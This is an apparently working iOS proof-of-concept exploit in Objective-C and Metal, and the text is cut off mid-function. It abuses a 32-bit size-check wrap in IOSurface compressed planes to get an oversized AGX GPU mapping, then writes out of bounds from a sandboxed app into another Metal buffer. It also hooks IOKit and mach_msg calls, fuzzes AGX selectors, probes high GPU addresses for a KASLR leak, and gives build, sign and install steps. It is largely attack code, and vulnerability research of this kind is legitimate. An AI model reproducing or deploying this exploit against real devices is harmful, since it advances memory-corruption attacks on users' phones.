// F1OOB-PoC — IOSurface compressed-plane 32-bit wrap -> AGX/Metal cross-object GPU OOB write.
//
// What this demonstrates:
//   1. A sandboxed app creates an IOSurface whose compressed-plane geometry passes
//      the kernel's multi-slice size check because the check is done in 32-bit:
//          (DataRegionBytesPerSlice + HeaderRegionBytesPerSlice) * SliceCount
//      wraps modulo 2^32 and becomes 0x10000, so a 4 GiB + 64 KiB logical region
//      is accepted for a 64 KiB allocation.
//   2. The IOSurface is handed to the AGX accelerator (selector 8, type 0x82).
//      The AGX resource is built with a 16 MiB length (out+0x28 on this device),
//      while the actual IOSurface allocation is only 64 KiB.
//   3. The same surface is wrapped in a 64 KiB MTLBuffer. The GPU VA of that
//      buffer is the start of the AGX resource's 16 MiB range. A second Metal
//      buffer allocated afterwards is placed inside that range.
//   4. A compute shader writes through the F1 buffer at the victim's GPU address.
//      The write lands in the victim MTLBuffer, proving a cross-object GPU OOB
//      write from a sandboxed app.
//
// This is NOT a kernel R/W primitive:
//   - the write stays inside the app's GPU VA/UAT context;
//   - it can only reach GPU pages that are already mapped in that context;
//   - the 16 MiB span is first-mapping-only on this build and is not guaranteed;
//   - fixed offsets are not portable; target by runtime gpuAddress.
//
// Build (Theos):
//   make ipa
// Sign (zsign):
//   zsign -k cert.p12 -p <pass> -m profile.mobileprovision -o F1OOB-PoC-signed.ipa F1OOB-PoC.ipa
// Install:
//   pymobiledevice3 apps install F1OOB-PoC-signed.ipa
// Run:
//   pymobiledevice3 developer core-device launch-application app.lake9674.aquila8809
// Logs:
//   Documents/F1OOB-PoC/latest.log

#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <IOKit/IOKitLib.h>
#import <IOSurface/IOSurfaceRef.h>
#import <Metal/Metal.h>
#import <objc/message.h>
#import <sys/utsname.h>
#import <pthread.h>
#import <string.h>

extern kern_return_t mach_vm_read_overwrite(vm_map_t target_task,
    mach_vm_address_t address, mach_vm_size_t size,
    mach_vm_address_t data, mach_vm_size_t *outsize);

#import <dlfcn.h>
#import "fishhook.h"
#import <mach/mach.h>

typedef kern_return_t (*iocm_fn)(io_connect_t, uint32_t, const uint64_t *, uint32_t,
                                 const void *, size_t, uint64_t *, uint32_t *, void *, size_t *);
static iocm_fn g_orig_iocm;
static void io_log(NSString *s);

static kern_return_t hook_iocm(io_connect_t conn, uint32_t sel, const uint64_t *in, uint32_t inCnt,
                               const void *inStruct, size_t inSize, uint64_t *out, uint32_t *outCnt,
                               void *outStruct, size_t *outSize) {
    if (!g_orig_iocm) g_orig_iocm = (iocm_fn)dlsym(RTLD_NEXT, "IOConnectCallMethod");
    if (sel == 6 || sel == 25 || sel == 45 || sel == 46 || sel == 8 || sel == 42 || sel == 44) {
        NSMutableString *m = [NSMutableString stringWithFormat:@"IO sel=%u conn=0x%x sc=%u si=0x%zx",
                              sel, conn, inCnt, inSize];
        for (uint32_t i = 0; i < inCnt && i < 8; i++)
            [m appendFormat:@" s%u=0x%llx", i, (unsigned long long)in[i]];
        if (inStruct && inSize) {
            const uint8_t *b = (const uint8_t *)inStruct;
            [m appendString:@" data="];
            for (size_t i = 0; i < inSize && i < 0x80; i++) [m appendFormat:@"%02x", b[i]];
        }
        io_log(m);
    }
    return g_orig_iocm(conn, sel, in, inCnt, inStruct, inSize, out, outCnt, outStruct, outSize);
}

typedef mach_msg_return_t (*mach_msg_ow_fn)(mach_msg_header_t *, mach_msg_option_t, mach_msg_size_t,
    mach_msg_size_t, mach_port_name_t, mach_msg_timeout_t, mach_port_name_t, mach_msg_header_t *,
    mach_msg_size_t);
static mach_msg_ow_fn g_orig_mach_msg_ow;
static int g_msg_logged;
static mach_msg_return_t hook_mach_msg_ow(mach_msg_header_t *msg, mach_msg_option_t opt,
    mach_msg_size_t send_size, mach_msg_size_t rcv_size, mach_port_name_t rcv_name,
    mach_msg_timeout_t timeout, mach_port_name_t notify, mach_msg_header_t *rcv_msg,
    mach_msg_size_t rcv_msg_size) {
    if (!g_orig_mach_msg_ow) g_orig_mach_msg_ow = (mach_msg_ow_fn)dlsym(RTLD_NEXT, "mach_msg_overwrite");
    if (msg && (opt & MACH_SEND_MSG) && send_size >= 0x30 && g_msg_logged < 200) {
        NSMutableString *m = [NSMutableString stringWithFormat:@"MSGOW id=0x%x size=0x%x", msg->msgh_id, send_size];
        const uint8_t *b = (const uint8_t *)msg;
        for (size_t i = 0x18; i < send_size && i < 0x18 + 0x60; i++) [m appendFormat:@"%02x", b[i]];
        io_log(m); g_msg_logged++;
    }
    return g_orig_mach_msg_ow(msg, opt, send_size, rcv_size, rcv_name, timeout, notify, rcv_msg, rcv_msg_size);
}

typedef mach_msg_return_t (*mach_msg_fn)(mach_msg_header_t *, mach_msg_option_t, mach_msg_size_t,
                                         mach_msg_size_t, mach_port_t, mach_msg_timeout_t, mach_port_t);
static mach_msg_fn g_orig_mach_msg;
static mach_msg_return_t hook_mach_msg(mach_msg_header_t *msg, mach_msg_option_t opt,
                                       mach_msg_size_t send_size, mach_msg_size_t rcv_size,
                                       mach_port_t rcv_name, mach_msg_timeout_t timeout,
                                       mach_port_t notify) {
    if (!g_orig_mach_msg) g_orig_mach_msg = (mach_msg_fn)dlsym(RTLD_NEXT, "mach_msg");
    if (msg && (opt & MACH_SEND_MSG) && send_size >= 0x30) {
        uint32_t mid = msg->msgh_id;
        if ((mid & 0xffff0000) == 0x002f0000 || (mid >= 0x002f0000 && mid < 0x00300000)) {
            NSMutableString *m = [NSMutableString stringWithFormat:@"MSG id=0x%x size=0x%x", mid, send_size];
            const uint8_t *b = (const uint8_t *)msg;
            for (size_t i = 0x18; i < send_size && i < 0x18 + 0x80; i++) [m appendFormat:@"%02x", b[i]];
            io_log(m);
        }
    }
    return g_orig_mach_msg(msg, opt, send_size, rcv_size, rcv_name, timeout, notify);
}

typedef kern_return_t (*iocms_fn)(io_connect_t, uint32_t, const void *, size_t, void *, size_t *);
typedef kern_return_t (*iocmsc_fn)(io_connect_t, uint32_t, const uint64_t *, uint32_t, uint64_t *, uint32_t *);
static iocms_fn g_orig_iocms;
static iocmsc_fn g_orig_iocmsc;

static kern_return_t hook_iocms(io_connect_t c, uint32_t sel, const void *sin, size_t ssz,
                                void *sout, size_t *osz) {
    if (!g_orig_iocms) g_orig_iocms = (iocms_fn)dlsym(RTLD_NEXT, "IOConnectCallStructMethod");
    if (sel == 6 || sel == 25 || sel == 45 || sel == 46 || sel == 8 || sel == 42 || sel == 44) {
        NSMutableString *m = [NSMutableString stringWithFormat:@"IOS sel=%u conn=0x%x si=0x%zx", sel, c, ssz];
        if (sin && ssz) { const uint8_t *b = sin; [m appendString:@" data="];
            for (size_t i = 0; i < ssz && i < 0x80; i++) [m appendFormat:@"%02x", b[i]]; }
        io_log(m);
    }
    return g_orig_iocms(c, sel, sin, ssz, sout, osz);
}
static kern_return_t hook_iocmsc(io_connect_t c, uint32_t sel, const uint64_t *in, uint32_t n,
                                 uint64_t *out, uint32_t *on) {
    if (!g_orig_iocmsc) g_orig_iocmsc = (iocmsc_fn)dlsym(RTLD_NEXT, "IOConnectCallScalarMethod");
    if (sel == 6 || sel == 25 || sel == 45 || sel == 46 || sel == 8 || sel == 42 || sel == 44) {
        NSMutableString *m = [NSMutableString stringWithFormat:@"IOSC sel=%u conn=0x%x n=%u", sel, c, n];
        for (uint32_t i = 0; i < n && i < 8; i++) [m appendFormat:@" s%u=0x%llx", i, (unsigned long long)in[i]];
        io_log(m);
    }
    return g_orig_iocmsc(c, sel, in, n, out, on);
}

__attribute__((used))
static struct { void *replacement; void *replacee; }
interpose_iocm __attribute__((section("__DATA,__interpose"))) = {
    (void *)hook_iocm, (void *)IOConnectCallMethod
};

static NSString *gDir;
static NSString *gLogPath;
static NSMutableString *gLog;
static pthread_mutex_t gLock = PTHREAD_MUTEX_INITIALIZER;

static void L(NSString *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    pthread_mutex_lock(&gLock);
    [gLog appendString:s];
    [gLog appendString:@"\n"];
    [gLog writeToFile:gLogPath atomically:YES encoding:NSUTF8StringEncoding error:nil];
    pthread_mutex_unlock(&gLock);
    NSLog(@"[F1OOB] %@", s);
}

static void io_log(NSString *s) {
    NSString *path = [gDir stringByAppendingPathComponent:@"metal_io.log"];
    NSString *line = [s stringByAppendingString:@"\n"];
    NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:path];
    if (!fh) { [line writeToFile:path atomically:YES encoding:NSUTF8StringEncoding error:nil]; }
    else { [fh seekToEndOfFile]; [fh writeData:[line dataUsingEncoding:NSUTF8StringEncoding]]; [fh closeFile]; }
}

static uint32_t rd32(const void *p) {
    uint32_t v;
    memcpy(&v, p, 4);
    return v;
}

static uint64_t rd64(const void *p) {
    uint64_t v;
    memcpy(&v, p, 8);
    return v;
}

static uint64_t gpu_address(id obj) {
    SEL sel = NSSelectorFromString(@"gpuAddress");
    if (!obj || ![obj respondsToSelector:sel]) return 0;
    return ((uint64_t (*)(id, SEL))objc_msgSend)(obj, sel);
}

// Normal 64x64 BGRA control surface. It is created before the F1 surface so the
// IOSurface ID/allocator state matches the original crash/repro sequence.
static NSString *normal_xml(void) {
    return @"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
    "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n"
    "<plist version=\"1.0\"><dict>"
    "<key>IOSurfaceWidth</key><integer>64</integer>"
    "<key>IOSurfaceHeight</key><integer>64</integer>"
    "<key>IOSurfaceBytesPerElement</key><integer>4</integer>"
    "<key>IOSurfacePixelFormat</key><integer>1111970369</integer>"
    "</dict></plist>\n";
}

// F1 shape:
//   dataPerSlice   = 0x4000
//   headerPerSlice = 0x40000000
//   slices         = 4
//   (data + header) * slices = 0x100010000 -> 32-bit 0x10000
//   planeSize = 0x10000, so the kernel check passes.
// The true logical region is 0x100010000 (4 GiB + 64 KiB).
static NSString *f1_xml(void) {
    return @"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
    "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n"
    "<plist version=\"1.0\"><dict>"
    "<key>IOSurfaceWidth</key><integer>64</integer>"
    "<key>IOSurfaceHeight</key><integer>64</integer>"
    "<key>IOSurfaceBytesPerElement</key><integer>4</integer>"
    "<key>IOSurfacePixelFormat</key><integer>1111970369</integer>"
    "<key>IOSurfaceAllocSize</key><integer>65536</integer>"
    "<key>IOSurfaceSliceCount</key><integer>4</integer>"
    "<key>IOSurfacePlaneInfo</key><array><dict>"
    "<key>IOSurfacePlaneWidth</key><integer>64</integer>"
    "<key>IOSurfacePlaneHeight</key><integer>64</integer>"
    "<key>IOSurfacePlaneBytesPerElement</key><integer>4</integer>"
    "<key>IOSurfacePlaneBytesPerRow</key><integer>512</integer>"
    "<key>IOSurfacePlaneSize</key><integer>65536</integer>"
    "<key>IOSurfacePlaneCompressionType</key><integer>4</integer>"
    "<key>IOSurfacePlaneDataRegionBytesPerSlice</key><integer>16384</integer>"
    "<key>IOSurfacePlaneHeaderRegionBytesPerSlice</key><integer>1073741824</integer>"
    "<key>IOSurfacePlaneCompressedTileWidth</key><integer>32</integer>"
    "<key>IOSurfacePlaneCompressedTileHeight</key><integer>32</integer>"
    "<key>IOSurfacePlaneBytesPerCompressedTileHeader</key><integer>8</integer>"
    "<key>IOSurfacePlaneBytesPerTileData</key><integer>4096</integer>"
    "<key>IOSurfacePlaneWidthInCompressedTiles</key><integer>2</integer>"
    "<key>IOSurfacePlaneHeightInCompressedTiles</key><integer>2</integer>"
    "<key>IOSurfacePlaneBytesPerRowOfTileData</key><integer>8192</integer>"
    "<key>IOSurfacePlaneCompressedTileHeaderRegionOffset</key><integer>65536</integer>"
    "<key>IOSurfacePlaneCompressedTileDataRegionOffset</key><integer>0</integer>"
    "<key>IOSurfacePlaneBytesPerRowOfCompressedTileHeaderGroups</key><integer>0</integer>"
    "</dict></array></dict></plist>\n";
}

// Raw IOSurfaceRoot selector 0 (the same in-band XML path used by the kernel parser).
static uint32_t create_surface(io_connect_t conn, NSString *xml, const char *tag) {
    const char *xc = xml.UTF8String;
    size_t raw = xc ? strlen(xc) + 1 : 0;
    if (!xc || raw > 0x2000) {
        L(@"[%s] XML too large: %zu", tag, raw);
        return 0;
    }
    L(@"[%s] xml len=%zu mod8=%zu", tag, raw, raw % 8);
    void *xcopy = NULL;
    if (posix_memalign(&xcopy, 0x4000, (raw + 0x3fff) & ~0x3fffULL) != 0 || !xcopy) {
        L(@"[%s] xml copy alloc failed", tag);
        return 0;
    }
    memset(xcopy, 0, (raw + 0x3fff) & ~0x3fffULL);
    memcpy(xcopy, xc, raw);
    uint64_t sc[1] = {0};
    uint8_t *info = calloc(1, 0xc68);
    size_t isz = 0xc68;
    kern_return_t kr = IOConnectCallMethod(conn, 0, sc, 1, xcopy, raw,
                                           NULL, NULL, info, &isz);
    free(xcopy);
    uint32_t sid = isz >= 0x1c ? rd32(info + 0x18) : 0;
    L(@"[%s] sel0=0x%x out=0x%zx id=%u", tag, kr, isz, sid);
    if (kr == KERN_SUCCESS && isz >= 0x78) {
        L(@"[%s] sliceCount=0x%x headerPerSlice=0x%x dataPerSlice=0x%x",
          tag, rd32(info + 0x74), rd32(info + 0x88 + 0x84),
          rd32(info + 0x88 + 0x80));
    }
    free(info);
    return kr == KERN_SUCCESS ? sid : 0;
}

// AGX accelerator selector 8, type 0x82: build a GPU resource from an IOSurface.
// out+0x00 = GPU VA of the resource, out+0x28 = resource length/span.
static uint64_t agx_map(uint32_t sid, uint64_t *span, io_connect_t *out_ac) {
    *span = 0;
    *out_ac = 0;
    io_service_t agx = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                   IOServiceMatching("AGXAcceleratorG14P"));
    if (!agx) {
        L(@"[AGX] AGXAcceleratorG14P not found");
        return 0;
    }
    io_connect_t ac = 0;
    kern_return_t kr = IOServiceOpen(agx, mach_task_self(), 1, &ac);
    IOObjectRelease(agx);
    L(@"[AGX] IOServiceOpen(type=1) -> 0x%x conn=0x%x", kr, ac);
    if (kr != KERN_SUCCESS) return 0;

    uint8_t *in = calloc(1, 0x100);
    uint8_t *out = calloc(1, 0x1000);
    *(uint32_t *)(in + 0x00) = 0x82;  // resource type
    *(uint32_t *)(in + 0x34) = 0;     // reserved/flags
    *(uint32_t *)(in + 0x38) = sid;   // IOSurface ID
    *(uint32_t *)(in + 0x3c) = 0;     // reserved/flags
    size_t osz = 0x1000;
    kr = IOConnectCallMethod(ac, 8, NULL, 0, in, 0x100, NULL, NULL, out, &osz);
    uint64_t ga = rd64(out + 0x00);
    uint64_t sp = rd64(out + 0x28);
    uint64_t obj = rd64(out + 0x10);
    L(@"[AGX] sel8=0x%x gpuVA=0x%llx span=0x%llx out10=0x%llx out18=0x%llx",
      kr, ga, sp, obj, rd64(out + 0x18));
    if (obj) {
        uint8_t *buf = calloc(1, 0x200);
        mach_vm_size_t sz = 0x200;
        kern_return_t mr = mach_vm_read_overwrite(mach_task_self(), obj, 0x200,
                                                  (mach_vm_address_t)buf, &sz);
        L(@"[AGX] vm_read(0x%llx) -> 0x%x size=0x%llx", obj, mr, (unsigned long long)sz);
        if (mr == KERN_SUCCESS) {
            for (size_t o = 0; o < 0x200; o += 8)
                L(@"[AGXOBJ] +0x%03zx = 0x%016llx", o, (unsigned long long)rd64(buf + o));
        }
        free(buf);
    }
    free(in);
    free(out);
    if (kr != KERN_SUCCESS) {
        IOServiceClose(ac);
        return 0;
    }
    *span = sp;
    *out_ac = ac;  // keep open: the resource lives with the connection
    return ga;
}

// Create 32 normal IOSurfaces after F1, fill them with a pattern. They reproduce
// the allocator/VA layout of the original probe; the actual OOB target is the
// Metal victim buffer below.
static int create_iosurface_victims(IOSurfaceRef *victims, int max) {
    int vc = 0;
    for (int i = 0; i < max; i++) {
        NSDictionary *props = @{
            @"IOSurfaceWidth": @64,
            @"IOSurfaceHeight": @64,
            @"IOSurfaceBytesPerElement": @4,
            @"IOSurfacePixelFormat": @0x42475241,
            @"IOSurfaceAllocSize": @0x10000
        };
        IOSurfaceRef v = IOSurfaceCreate((__bridge CFDictionaryRef)props);
        if (!v) break;
        void *base = IOSurfaceGetBaseAddress(v);
        if (base) {
            uint32_t *p = (uint32_t *)base;
            for (size_t o = 0; o + 4 <= 0x10000; o += 4)
                p[o / 4] = 0x11111111u + (uint32_t)i;
        }
        victims[vc++] = v;
    }
    L(@"[VICTIM] IOSurfaces created=%d", vc);
    return vc;
}

// Core GPU OOB proof.
static void queue_size_fuzz(io_connect_t c, const char *tag) {
    if (!c) { L(@"[QFUZZ] %s no conn", tag); return; }
    uint8_t *buf = calloc(1, 0x4000);
    for (uint32_t sz = 0x100; sz <= 0x8000; sz += 4) {
        memset(buf, 0, 0x4000);
        if (sz > 0x400) *(uint32_t *)(buf + 0x400) = 0;
        uint8_t out[0x10]; memset(out, 0, sizeof(out)); size_t osz = sizeof(out);
        kern_return_t kr = IOConnectCallMethod(c, 6, NULL, 0, buf, sz, NULL, NULL, out, &osz);
        if (kr != 0xe00002c2) {
            L(@"[QFUZZ] %s size=0x%x -> 0x%x id=0x%llx q550=0x%llx", tag, sz, kr,
              (unsigned long long)rd64(out), (unsigned long long)rd64(out + 8));
            free(buf); return;
        }
    }
    uint32_t cand[] = {0x8000, 0x10000, 0x20000, 0x40000, 0x80000, 0x100000,
                       0x200000, 0x400000, 0x1000, 0x2000, 0x3000, 0x4080};
    for (unsigned i = 0; i < sizeof(cand)/sizeof(cand[0]); i++) {
        uint32_t sz = cand[i];
        memset(buf, 0, 0x4000);
        uint8_t out[0x10]; memset(out, 0, sizeof(out)); size_t osz = sizeof(out);
        kern_return_t kr = IOConnectCallMethod(c, 6, NULL, 0, buf, sz, NULL, NULL, out, &osz);
        L(@"[QFUZZ] %s cand size=0x%x -> 0x%x id=0x%llx q550=0x%llx", tag, sz, kr,
          (unsigned long long)rd64(out), (unsigned long long)rd64(out + 8));
        if (kr != 0xe00002c2) { free(buf); return; }
    }
    L(@"[QFUZZ] %s no size in [0x100,0x4000] accepted", tag);
    free(buf);
}

static void virtmem_probe(io_connect_t, const char *);
static void queue_submit_probe(io_connect_t, const char *);
static void sysmem_type0_probe(io_connect_t, const char *);
static void info_probe2(io_connect_t, const char *);
static void metal_cross_object_write(IOSurfaceRef surf, uint64_t agx_va, uint64_t agx_span, io_connect_t agx_conn) {
    L(@"[METAL] start");
    id<MTLDevice> dev = MTLCreateSystemDefaultDevice();
    if (!dev) { L(@"[METAL] no device"); return; }
    L(@"[METAL] device=%@", [dev name]);

    void *base = IOSurfaceGetBaseAddress(surf);
    size_t alloc = IOSurfaceGetAllocSize(surf);
    if (!base || alloc < 0x10000) {
        L(@"[METAL] bad surface base=%p alloc=0x%zx", base, alloc);
        return;
    }

    // 64 KiB Metal wrapper around the 64 KiB IOSurface.
    id<MTLBuffer> f1buf = [dev newBufferWithBytesNoCopy:base
                                                 length:0x10000
                                                options:MTLResourceStorageModeShared
                                            deallocator:nil];
    uint64_t f1ga = gpu_address(f1buf);
    L(@"[METAL] F1 MTLBuffer=%p len=%lu gpuAddress=0x%llx agxVA=0x%llx span=0x%llx",
      f1buf, (unsigned long)f1buf.length, f1ga, agx_va, agx_span);

    // Victim buffer allocated after F1. It is expected to land inside the AGX
    // resource's 16 MiB VA range.
    // Fillers reproduce the VA placement of the original probe: after 15 x 64 KiB
    // allocations the victim lands around +0x100000 from the F1 base.
    id<MTLBuffer> fillers[6];
    for (int fi = 0; fi < 6; fi++) {
        fillers[fi] = [dev newBufferWithLength:0x10000
                                       options:MTLResourceStorageModeShared];
    }
    id<MTLBuffer> victim = [dev newBufferWithLength:0x10000
                                            options:MTLResourceStorageModeShared];
    if (!victim.contents) { L(@"[METAL] victim has no CPU contents"); return; }
    for (size_t o = 0; o + 4 <= 0x10000; o += 4)
        *(uint32_t *)((uint8_t *)victim.contents + o) = 0x42424242u;
    uint64_t victimga = gpu_address(victim);
    L(@"[METAL] victim MTLBuffer=%p len=%lu gpuAddress=0x%llx",
      victim, (unsigned long)victim.length, victimga);

    if (!f1ga || !victimga || victimga <= f1ga) {
        L(@"[METAL] no usable GPU addresses");
        return;
    }
    uint64_t delta = victimga - f1ga;
    L(@"[METAL] delta=0x%llx span=0x%llx inSpan=%s",
      delta, agx_span, (delta < agx_span) ? "yes" : "no");

    NSString *src =
        @"#include <metal_stdlib>\n"
        "using namespace metal;\n"
        "kernel void wr(device uint *buf [[buffer(0)]],\n"
        "               constant uint &idx [[buffer(1)]],\n"
        "               constant uint &val [[buffer(2)]]) {\n"
        "  buf[idx] = val;\n"
        "}\n"
        "kernel void rd(device uint *buf [[buffer(0)]],\n"
        "               device uint *out [[buffer(1)]],\n"
        "               constant uint &idx [[buffer(2)]]) {\n"
        "  out[0] = buf[idx];\n"
        "}\n"
        "kernel void rd64(device ulong *buf [[buffer(0)]],\n"
        "                 device ulong *out [[buffer(1)]],\n"
        "                 constant long &delta [[buffer(2)]]) {\n"
        "  out[0] = buf[delta / 8];\n"
        "}\n"
        "kernel void wr64(device ulong *buf [[buffer(0)]],\n"
        "                 constant long &delta [[buffer(1)]],\n"
        "                 constant ulong &val [[buffer(2)]]) {\n"
        "  buf[delta / 8] = val;\n"
        "}\n";
    NSError *err = nil;
    id<MTLLibrary> lib = [dev newLibraryWithSource:src options:nil error:&err];
    if (!lib) { L(@"[METAL] library error=%@", err); return; }
    id<MTLFunction> fwr = [lib newFunctionWithName:@"wr"];
    id<MTLFunction> frd = [lib newFunctionWithName:@"rd"];
    id<MTLFunction> frd64 = [lib newFunctionWithName:@"rd64"];
    id<MTLComputePipelineState> pwr = fwr ? [dev newComputePipelineStateWithFunction:fwr error:&err] : nil;
    id<MTLComputePipelineState> prd = frd ? [dev newComputePipelineStateWithFunction:frd error:&err] : nil;
    id<MTLFunction> fwr64 = [lib newFunctionWithName:@"wr64"];
    id<MTLComputePipelineState> pwr64 = fwr64 ? [dev newComputePipelineStateWithFunction:fwr64 error:&err] : nil;
    id<MTLComputePipelineState> prd64 = frd64 ? [dev newComputePipelineStateWithFunction:frd64 error:&err] : nil;
    if (!pwr || !prd) { L(@"[METAL] pipeline error=%@", err); return; }

    id<MTLBuffer> out = [dev newBufferWithLength:16 options:MTLResourceStorageModeShared];
    id<MTLCommandQueue> q = [dev newCommandQueue];

    if (delta > 0 && delta < 0x10000000) {
        uint32_t idx = (uint32_t)(delta / 4);
        uint32_t marker = 0x43434343u;

        // Pre-touch the victim through its OWN GPU VA so its PTEs are present
        // in the GPU page table before the F1 aliased access.
        {
            uint32_t pidx = 0;
            uint32_t pmark = 0x47474747u;
            id<MTLCommandBuffer> pb = [q commandBuffer];
            id<MTLComputeCommandEncoder> pe = [pb computeCommandEncoder];
            [pe setComputePipelineState:pwr];
            [pe setBuffer:victim offset:0 atIndex:0];
            [pe setBytes:&pidx length:4 atIndex:1];
            [pe setBytes:&pmark length:4 atIndex:2];
            [pe dispatchThreadgroups:MTLSizeMake(1,1,1) threadsPerThreadgroup:MTLSizeMake(1,1,1)];
            [pe endEncoding];
            [pb commit];
            [pb waitUntilCompleted];
            uint32_t pv = 0; memcpy(&pv, victim.contents, 4);
            L(@"[METAL] PRE-TOUCH status=%lu victim[0]=0x%08x expect=0x47474747",
              (unsigned long)pb.status, pv);
        }

        id<MTLCommandBuffer> wb = [q commandBuffer];
        id<MTLComputeCommandEncoder> we = [wb computeCommandEncoder];
        [we setComputePipelineState:pwr];
        [we setBuffer:f1buf offset:0 atIndex:0];
        [we setBytes:&idx length:4 atIndex:1];
        [we setBytes:&marker length:4 atIndex:2];
        [we dispatchThreadgroups:MTLSizeMake(1,1,1) threadsPerThreadgroup:MTLSizeMake(1,1,1)];
        [we endEncoding];
        [wb commit];
        [wb waitUntilCompleted];
        L(@"[METAL] WRITE idx=0x%x marker=0x%08x status=%lu err=%@",
          idx, marker, (unsigned long)wb.status, wb.error);

        uint32_t back = 0;
        memcpy(&back, victim.contents, 4);
        L(@"[METAL] VICTIM[0]=0x%08x", back);
        if (back == marker) {
            L(@"[METAL] *** CROSS-OBJECT GPU OOB WRITE CONFIRMED ***");
        } else {
            L(@"[METAL] no cross-object hit");
        }

        // Restore the victim's first word so the demo is non-destructive.
        uint32_t orig = 0x42424242u;
        id<MTLCommandBuffer> rb = [q commandBuffer];
        id<MTLComputeCommandEncoder> re = [rb computeCommandEncoder];
        [re setComputePipelineState:pwr];
        [re setBuffer:f1buf offset:0 atIndex:0];
        [re setBytes:&idx length:4 atIndex:1];
        [re setBytes:&orig length:4 atIndex:2];
        [re dispatchThreadgroups:MTLSizeMake(1,1,1) threadsPerThreadgroup:MTLSizeMake(1,1,1)];
        [re endEncoding];
        [rb commit];
        [rb waitUntilCompleted];
        L(@"[METAL] RESTORE status=%lu err=%@", (unsigned long)rb.status, rb.error);
    }

    // Reference test: fixed 0x20000 offset. This is not portable across boots,
    // but shows whether the page at that offset is backed in this run.
    {
        uint32_t idx = 0x20000 / 4;
        uint32_t marker = 0x41414141u;
        id<MTLCommandBuffer> wb = [q commandBuffer];
        id<MTLComputeCommandEncoder> we = [wb computeCommandEncoder];
        [we setComputePipelineState:pwr];
        [we setBuffer:f1buf offset:0 atIndex:0];
        [we setBytes:&idx length:4 atIndex:1];
        [we setBytes:&marker length:4 atIndex:2];
        [we dispatchThreadgroups:MTLSizeMake(1,1,1) threadsPerThreadgroup:MTLSizeMake(1,1,1)];
        [we endEncoding];
        [wb commit];
        [wb waitUntilCompleted];
        uint32_t back = 0;
        id<MTLCommandBuffer> rb = [q commandBuffer];
        id<MTLComputeCommandEncoder> re = [rb computeCommandEncoder];
        [re setComputePipelineState:prd];
        [re setBuffer:f1buf offset:0 atIndex:0];
        [re setBuffer:out offset:0 atIndex:1];
        [re setBytes:&idx length:4 atIndex:2];
        [re dispatchThreadgroups:MTLSizeMake(1,1,1) threadsPerThreadgroup:MTLSizeMake(1,1,1)];
        [re endEncoding];
        [rb commit];
        [rb waitUntilCompleted];
        if (out.contents) memcpy(&back, out.contents, 4);
        L(@"[METAL] FIXED +0x20000 write=0x%08x readback=0x%08x (may be 0/unbacked)",
          marker, back);
    }

    // High-VA probe: the F1 shader argument is a raw 64-bit GPU VA. Test whether
    // TTBAT/firmware VAs are mapped in this context. A fault stops the loop.
    if (prd64) {
        uint64_t targets[] = {
            0x1500000000ULL,              // F1 base
            victimga,                     // known victim (pre-touched)
            victimga + 8,
            0x1500000000ULL + 0x1000000ULL,
            0x1500000000ULL + 0x2000000ULL,
            0x13400000000ULL,
            0x13400000000ULL + 0x1000ULL,
            0x13400000000ULL + 0x2000ULL,
            0x100000000ULL,
            0x800000000ULL,
            0x1000000000ULL,
            0x2000000000ULL,
            0x4000000000ULL,
            0x8000000000ULL,
            0x10000000000ULL,
            0x20000000000ULL,
        };
        for (int ti = 0; ti < (int)(sizeof(targets)/sizeof(targets[0])); ti++) {
            uint64_t target = targets[ti];
            int64_t d = (int64_t)(target - f1ga);
            L(@"[HIGHVA] target=0x%llx delta=0x%llx", target, (unsigned long long)d);
            id<MTLCommandBuffer> hb = [q commandBuffer];
            id<MTLComputeCommandEncoder> he = [hb computeCommandEncoder];
            [he setComputePipelineState:prd64];
            [he setBuffer:f1buf offset:0 atIndex:0];
            [he setBuffer:out offset:0 atIndex:1];
            [he setBytes:&d length:8 atIndex:2];
            [he dispatchThreadgroups:MTLSizeMake(1,1,1) threadsPerThreadgroup:MTLSizeMake(1,1,1)];
            [he endEncoding];
            [hb commit];
            [hb waitUntilCompleted];
            if (hb.status == MTLCommandBufferStatusError) {
                L(@"[HIGHVA] FAULT target=0x%llx err=%@", target, hb.error);
                break;
            }
            uint64_t hv = 0;
            if (out.contents) memcpy(&hv, out.contents, 8);
            L(@"[HIGHVA] value=0x%llx", (unsigned long long)hv);
        }
    }

    // AGX/IOGPU command queue: sel6 returns {id, queue[+0x550]}. If the second
    // value is a GPU VA, read it through the F1 alias; if it is a kernel
    // pointer, log it (potential KASLR leak). Try both IOGPU and AGX clients.
    io_connect_t qconn = agx_conn;
    io_connect_t iogpu_conn = 0;
    {
        io_service_t isvc = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                        IOServiceMatching("IOGPU"));
        if (isvc) {
            kern_return_t okr = IOServiceOpen(isvc, mach_task_self(), 1, &iogpu_conn);
            IOObjectRelease(isvc);
            L(@"[QUEUE] IOGPU open type1 -> 0x%x conn=0x%x", okr, iogpu_conn);
            if (okr == KERN_SUCCESS && iogpu_conn) qconn = iogpu_conn;
        }
    }
    if (qconn) {
        info_probe2(agx_conn, "AGX");
    sysmem_type0_probe(agx_conn, "AGX");
    queue_submit_probe(agx_conn, "AGX");
    virtmem_probe(agx_conn, "AGX");
    queue_size_fuzz(agx_conn, "AGX");
        queue_size_fuzz(iogpu_conn, "IOGPU");
        uint8_t *qin = calloc(1, 0x4000);
        uint8_t qout[0x10]; memset(qout, 0, sizeof(qout)); size_t qsz = sizeof(qout);
        memset(qin, 0, 0x4000);
        *(uint32_t *)(qin + 0x400) = 0;
        kern_return_t qkr = IOConnectCallMethod(qconn, 6, NULL, 0, qin, 0x408,
                                                NULL, NULL, qout, &qsz);
        L(@"[QUEUE] sel6(qconn)=0x%x osz=0x%zx id=0x%llx q550=0x%llx", qkr, qsz,
          (unsigned long long)rd64(qout), (unsigned long long)rd64(qout + 8));
        if (qkr == KERN_SUCCESS && qout[1] && prd64) {
            int64_t d = (int64_t)(qout[1] - f1ga);
            id<MTLCommandBuffer> qb = [q commandBuffer];
